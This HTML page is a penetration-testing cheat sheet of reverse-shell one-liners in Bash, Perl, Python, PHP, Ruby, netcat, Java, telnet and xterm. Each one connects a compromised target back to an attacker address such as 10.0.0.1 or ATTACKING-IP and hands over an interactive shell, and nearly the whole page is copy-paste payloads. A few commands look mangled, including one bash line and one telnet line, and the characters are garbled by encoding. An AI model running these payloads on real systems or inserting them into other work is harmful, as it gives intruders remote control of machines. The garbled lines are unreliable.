I"›<h1 class="no_toc" id="summary">Summary</h1>

<ul id="markdown-toc">
  <li><a href="#general" id="markdown-toc-general">General</a></li>
  <li><a href="#bash" id="markdown-toc-bash">Bash</a></li>
  <li><a href="#perl" id="markdown-toc-perl">PERL</a></li>
  <li><a href="#python" id="markdown-toc-python">Python</a></li>
  <li><a href="#php" id="markdown-toc-php">PHP</a></li>
  <li><a href="#ruby" id="markdown-toc-ruby">Ruby</a></li>
  <li><a href="#netcat" id="markdown-toc-netcat">Netcat</a></li>
  <li><a href="#java" id="markdown-toc-java">Java</a></li>
  <li><a href="#telnet" id="markdown-toc-telnet">Telnet</a></li>
  <li><a href="#xterm" id="markdown-toc-xterm">xterm</a></li>
</ul>

<h1 id="general">General</h1>

<p>If you‚Äôre lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you‚Äôll probably want an interactive shell.</p>

<p>If it‚Äôs not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>

<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system ‚Äì though you could probably upload a binary program too if you‚Äôre suitably well prepared.</p>

<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute ‚Äú/bin/sh -i‚Äù with ‚Äúcmd.exe‚Äù.</p>

<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they‚Äôre quite short lines, but not very readable.</p>

<h1 id="bash">Bash</h1>

<p>Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec /bin/bash 0&amp;0 2&gt;&amp;0
</code></pre></div></div>
<h1 id="perl">PERL</h1>

<p>Here‚Äôs a shorter, feature-free version of the   perl-reverse-shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<p>Also for Windows</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<h1 id="python">Python</h1>

<p>This was tested under Linux / Python 2.7:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre></div></div>

<h1 id="php">PHP</h1>

<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn‚Äôt work, try 4, 5, 6‚Ä¶</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre></div></div>

<p>If you want a .php file to upload, see the more featureful and robust php-reverse-shell.</p>

<h1 id="ruby">Ruby</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre></div></div>

<h1 id="netcat">Netcat</h1>

<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don‚Äôt support the -e option.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -e /bin/sh 10.0.0.1 1234
</code></pre></div></div>

<p>If you have the wrong version of netcat installed, you might still be able to get your reverse shell back like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre></div></div>

<h1 id="java">Java</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre></div></div>

<h1 id="telnet">Telnet</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
</code></pre></div></div>

<p>Remember to listen on 443 on the attacking machine also.</p>

<h1 id="xterm">xterm</h1>

<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xterm -display 10.0.0.1:1
</code></pre></div></div>

<p>To catch the incoming xterm, start an X-Server (:1 ‚Äì which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Xnest :1
</code></pre></div></div>

<p>You‚Äôll need to authorise the target to connect to you (command also run on your host):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xhost +targetip
</code></pre></div></div>
:ET